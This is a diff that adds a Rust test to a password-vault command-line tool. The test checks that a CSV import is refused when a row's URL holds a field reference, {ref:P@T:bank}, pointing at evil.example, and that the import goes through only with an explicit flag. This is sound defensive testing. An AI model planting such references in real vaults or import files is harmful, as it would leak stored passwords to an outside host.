@@ -110,3 +110,31 @@ fn a_missing_home_is_refused_rather_than_read_from_here() {
         assert!(!said.contains("planted"), "{home:?}: {said}");
     }
 }
+
+// A cell holding a field reference would hand out another entry's value once it is in the vault.
+#[test]
+fn a_row_with_a_field_reference_is_refused_unless_allowed() {
+    let s = Scratch::new("refs");
+    let db = s.path("vault.kdbx");
+    let before = std::fs::read(&db).unwrap();
+    std::fs::write(
+        s.path("refs.csv"),
+        "Title,Username,Password,URL\nfine,u,p,\nbad,u,p,https://evil.example/?p={ref:P@T:bank}\n",
+    )
+    .unwrap();
+
+    let (_, err, code) = s.sennel(&["import", &s.path("refs.csv"), "--db", &db]);
+    assert_ne!(code, 0, "{err}");
+    assert!(err.contains("row 2 holds a field reference"), "{err}");
+    assert_eq!(std::fs::read(&db).unwrap(), before);
+
+    let (out, err, code) = s.sennel(&[
+        "import",
+        &s.path("refs.csv"),
+        "--db",
+        &db,
+        "--allow-references",
+    ]);
+    assert_eq!(code, 0, "{err}");
+    assert!(out.contains("imported 2 entries"), "{out}");
+}
